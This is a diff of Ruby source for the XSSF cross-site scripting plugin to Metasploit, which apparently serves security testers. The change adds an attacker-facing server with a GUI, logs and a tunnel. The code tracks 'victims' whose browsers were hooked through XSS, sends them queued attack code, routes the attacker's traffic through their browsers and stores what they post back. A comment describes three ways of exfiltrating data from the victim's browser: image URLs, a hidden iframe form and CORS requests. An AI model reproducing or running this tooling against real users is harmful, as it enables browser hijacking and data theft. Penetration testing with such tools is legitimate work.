@@ -3,7 +3,12 @@ require 'rex/ui'
 require 'uri'
 require 'webrick'
 require 'base64'
-  
+
+include WEBrick
+
+#
+# This module implements a HTTP Server used for the new XSSF plugin.
+#
 module Msf
 	module Xssf
 		module XssfMaster
@@ -21,52 +26,92 @@ module Msf
 				
 				self.server  = WEBrick::HTTPServer.new(
 					:Port				=> port,
-					:Logger				=> WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL),
-					:AccessLog			=> [[ WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL), WEBrick::AccessLog::COMBINED_LOG_FORMAT ]],
+					:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
 					:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
 					:ServerType 		=> Thread,
 					:MaxClients     	=> 1000,
 					:DoNotReverseLookup => true
 				)
-				# self.server.mount('/resources/',  HTTPServlet::FileHandler, INCLUDED_FILES)
+
+				self.server.mount(XSSF_RRC_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_RRC_FILES)
 				self.server.mount_proc("#{uri}") { |req, res| xssf_process_request(req, res) }	# Listening connections to URI
 				self.server.start
   
-				return false if not register_server(self.serverHost, port, uri)				
-
+				return false if not register_server(self.serverHost, port, uri)			
+				
 				# Check in background for active victims !
 				Thread.new do; while (self.server) do;	update_active_victims;	Rex::ThreadSafe.sleep(2);	end; end
+				
+
+				# Starting GUI and Proxy server
+				begin
+					self.attacker_srv  = WEBrick::HTTPServer.new(
+						:BindAddress 		=> XSSF_PUBLIC[0] ? '0.0.0.0' : '127.0.0.1',
+						:Port				=> port + 1,
+						:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
+						:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
+						:ServerType 		=> Thread,
+						:MaxClients     	=> 1000,
+						:DoNotReverseLookup => true
+					)
+
+					self.attacker_srv.mount(XSSF_GUI_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_GUI_FILES)
+					self.attacker_srv.mount(XSSF_LOG_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_LOG_FILES)
+					self.attacker_srv.mount_proc("/") { |req, res| xssf_process_attacker_request(req, res) }
+
+					self.attacker_srv.start
+				rescue
+					print_error("Error starting attackers' server : #{$!}.")
+					print_error("XSSF Tunnel and GUI pages won't be available.\n")
+				end
 				
 				return true
 			end
 
 			#
-			# Stops the server
+			# Stops the servers
 			#
 			def stop
 				(self.server.unmount("#{self.serverURI}"); self.server.shutdown) if self.server;
+				(self.attacker_srv.unmount("/"); self.attacker_srv.shutdown) if self.attacker_srv;
 			end
 			
+			
 			#
-			# This method is triggered each time a request is done on the URI.
+			# This method is triggered each time a request is done on GUI pages or XSSF Tunnel by attacker
+			#
+			def xssf_process_attacker_request(req, res)
+				begin
+					case req.path					
+						# Victim log page is asked
+						when /^#{self.serverURI + VICTIM_GUI}/
+							build_log_page(req, res)
+							
+						else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
+							if ((v = victim_tunneled) && (req.request_method =~ /^(GET|POST)$/i))
+								xssf_tunnel_request(req, res, v)
+							else
+								XSSF_404(res)
+						end
+					end
+				rescue
+					XSSF_404(res) 
+					print_error("Error 27: #{$!}") if XSSF_DEBUG_MODE[0]
+				end
+			end
+			
+			
+			#
+			# This method is triggered each time a request is done on the URI by a victim.
 			#
 			def xssf_process_request(req, res)
 				begin
-					if ((req.unparsed_uri.to_s =~ /^http:\/\/.*$/) && (req.host != self.serverHost))	# Request done in Tunnel mode
-						if ((victim_tunneled && (req.request_method =~ /^(GET|POST)$/i)) && 
-							((req.peeraddr[3] == self.serverHost) or (req.peeraddr[3] == "localhost") or (req.peeraddr[3] == "127.0.0.1") or XSSF_FROM_OUTSIDE[0]) )
-							xssf_tunnel_request(req, res, victim_tunneled)
-						else
-							XSSF_404(res)
-						end
-					else																																			# Request done to access a server ressource	
-						req.query["#{PARAM_ID}"] ? id = (req.query["#{PARAM_ID}"]).to_i : ((req.cookies.to_s =~ /#{PARAM_ID}=(\d+)/) ? id = $1.to_i : id = nil)
+					req.query["#{PARAM_ID}"] ? id = (req.query["#{PARAM_ID}"]).to_i : ((req.cookies.to_s =~ /#{PARAM_ID}=(\d+)/) ? id = $1.to_i : id = nil)
 						
-						case req.request_method.upcase
-							when 'GET';		process_get(req, res, id)			# Case of a GET request
-							when 'POST';	process_post(req, res, id) 			# Case of a POST request
-							else;			process_unknown(req, res, id)
-						end
+					case req.request_method.upcase
+						when 'GET';		process_get(req, res, id)			# Case of a GET request
+						when 'POST';	process_post(req, res, id) 			# Case of a POST request
+						else;			process_unknown(req, res, id)
 					end
 				rescue
 					XSSF_404(res) 
@@ -108,7 +153,7 @@ module Msf
 								
 							if (attack = get_first_attack(id))								# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
 								if (http_request_module(res, attack[0], req, id))
-									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'")
+									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not XSSF_QUIET_MODE[0]
 									attacked_victims; 	create_log(id, "Attack '#{attack[1]}' launched at url '#{attack[0]}'", nil) 
 								end
 							else
@@ -142,11 +187,7 @@ module Msf
 					# Page asked is the XSSF test page (for test or ghost)
 					when /^#{self.serverURI + VICTIM_TEST}/
 						XSSF_RESP(res, test_page(req.host))
-						
-					# Victim log page is asked
-					when /^#{self.serverURI + VICTIM_GUI}/
-						build_log_page(req, res)
-						
+							
 					else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
 						process_unknown(req, res, id)
 				end
@@ -188,15 +229,15 @@ module Msf
 									TUNNEL.delete(tunnelid) if ((TUNNEL[tunnelid][1].to_s).size > 10000000) 	# Deleting if more than 10Mo of data	
 								}
 
-								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})")
+								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})") if not XSSF_QUIET_MODE[0]
 								XSSF_RESP(res)
 							else
 								XSSF_404(res)
 							end
 						else								# POST FROM A MODULE
 							file_id = Rex::Text.rand_text_alphanumeric(rand(20) + 10)
-							File.open(INCLUDED_FILES + XSSF_LOG_FILES + file_id.to_s, 'wb') {|f| f.write((response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)) }
-							create_log(id, file_id, URI.unescape(mod_name).strip)
+							File.open(INCLUDED_FILES + XSSF_LOG_FILES + file_id.to_s + ".html", 'wb') {|f| f.write((response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)) }
+							create_log(id, file_id.to_s + ".html", URI.unescape(mod_name).strip)
 							XSSF_RESP(res)
 						end
 						
@@ -205,35 +246,24 @@ module Msf
 														'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"',
 														'Set-Cookie' 	=> "id=#{id}; Path=/;"})
 					
-					else # Other page is asked by a victim : redirect to known file or active module (This part needs cookie to be activated) 
+					else # Other page is asked by a victim: redirect to known file or active module (This part needs cookie to be activated) 
 						process_unknown(req, res, id)
 				end
 			end
 
 			#
-			# Unknown page or method is asked by a victim
-			# Redirect to known file or active module (This part needs cookie to be activated)
+			# Unknown page or method is asked by a victim => redirect to known active module (This part needs cookie to be activated)
 			#
 			def process_unknown(req, res, id)
-				file_name = INCLUDED_FILES + Rex::Text.to_hex_ascii(req.unparsed_uri)
-				
-				if (File.exist?(file_name) and (Rex::Text.to_hex_ascii(req.unparsed_uri) != '/'))			# If file is known, server sends it directly to the victim, if not, asking to the module !
-					if (((file_name =~ /#{XSSF_GUI_FILES}/i) or (file_name =~ /#{XSSF_LOG_FILES}/i)) and not ((req.peeraddr[3] == self.serverHost) or XSSF_FROM_OUTSIDE[0]))
-						XSSF_404(res)
-					else
-						XSSF_RESP(res, add_xssf_post(File.open(file_name, "rb") {|io| io.read }, id, req.host), 200, "OK", {'Content-type' => (File.extname(file_name) == '.html') ? 'text/html' : 'application/octet-steam'})
-					end
+				if (url = current_attack(id))	
+					(data = run_http_client(url, req, true)) ? XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers) : XSSF_404(res)
 				else
-					if (url = current_attack(id))	
-						(data = run_http_client(url, req, true)) ? XSSF_RESP(res, add_xssf_post(data.body, id, req.host), data.code, data.message, data.headers) : XSSF_404(res)
-					else
-						XSSF_404(res)
-					end
+					XSSF_404(res)
 				end
 			end
 			
 		protected
-			attr_accessor :server, :serverURI, :serverPort, :serverHost, :proxy
+			attr_accessor :server, :serverURI, :serverPort, :serverHost, :attacker_srv
 			
 			#
 			# Sends XSSF 404 page
@@ -399,15 +429,15 @@ module Msf
 			# Returns XSSF provided functions, including XSSF_POST
 			#
 			# XSSF POST METHODS EXPLANATION :
-			#    * OPTION 1 : using <image src="http://XSSF_SERVER/data=xxxxx" />. 
+			#    * OPTION 1: using <image src="http://XSSF_SERVER/data=xxxxx" />. 
 			#		+ Supported by all browsers
 			#		- Limited by URI size (2083 bytes in IE). 
 			#		- Long URI size (>= 1Mo) end with a Webrick crash.
-			#    * OPTION 2 : using a <FORM> element within invisible <IFRAME> posting to XSSF_SERVER. 
+			#    * OPTION 2: using a <FORM> element within invisible <IFRAME> posting to XSSF_SERVER. 
 			#		+ Supported by all browsers
 			#		+ No size limitation inside browser
 			#		- Secured domain (HTTPS) will prompt user that secure data is sent over unsecure method
-			#     * OPTION 3 : using the new Cross-Origin Resource Sharing property with XMLHttpRequest or XDomainRequest elements.
+			#     * OPTION 3: using the new Cross-Origin Resource Sharing property with XMLHttpRequest or XDomainRequest elements.
 			#       + No size limitation inside browser
 			#       + Works without alerting user on HTTPs domains
 			#		- Only supported by browser implementing HTML5 Cross-Origin Resource Sharing specification (IE 8+, FF 3.5+, Safari 4+, Chrome, Android Browser 2.1+, IOS Safari 3.2+)
@@ -583,3 +613,4 @@ module Msf
 		end
 	end
 end
+
